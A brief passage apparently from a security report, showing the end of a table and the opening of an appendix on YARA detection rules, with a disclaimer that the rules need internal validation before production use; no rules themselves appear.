launcher.|\n\n\n-----\n\n###### Appendix 5: YARA Rules\nThe following YARA rules are not intended to be used on production systems or to inform blocking rules without first being validated\nthrough an organization's own internal testing processes to ensure appropriate performance and limit the risk of false positives.
